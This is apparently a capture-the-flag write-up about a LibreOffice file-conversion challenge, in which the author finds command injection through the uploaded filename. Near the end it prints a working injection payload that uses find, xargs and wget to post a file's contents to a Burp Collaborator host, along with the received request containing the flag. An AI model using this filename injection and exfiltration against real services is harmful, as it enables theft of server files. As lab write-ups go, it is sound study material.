tried with an html and iframe to my site. it worked. tried js, no. iframe doesn't work properly, just sends request.

```
37.128.230.46 - - [06/Apr/2019:10:39:45 +0000] "OPTIONS / HTTP/1.1" 405 166 "-" "LibreOffice"
37.128.230.46 - - [06/Apr/2019:10:39:45 +0000] "HEAD / HTTP/1.1" 200 0 "-" "LibreOffice"
37.128.230.46 - - [06/Apr/2019:10:39:45 +0000] "GET / HTTP/1.1" 200 93 "-" "LibreOffice"
```

then i tried everything. found something about remote arbitrary file disclosure in LibreOffice. tried that, didnt work.


left it like that, got to work on other challenges.

got back. https://github.com/BuffaloWill/oxml_xxe.git nothing. svg, xml xxe.

reading the hint i figured i should think deeper how they process this. well i already now it's a libre office convert. and allows lots of files. but what if the filename is used in the command? let's try that.

`sleep 4`. it worked. remembering a challenge from defcamp last year, let's try dig with burp collaborator. it works.

lets exfiltrate with dig. tedious

a lot of tries later

```
$(find src | grep flag.js | head -n1 | xargs -I{} wget v0w0824vj4o195hog7gz3trvomuci1.burpcollaborator.net --post-data a={})
```

```
POST / HTTP/1.1
User-Agent: Wget/1.19.4 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: v0w0824vj4o195hog7gz3trvomuci1.burpcollaborator.net
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 90

a=module.exports = ECSC{98028539a362efecbde13ae4df924e02432555bb1f4730219938330651d84f35};
```
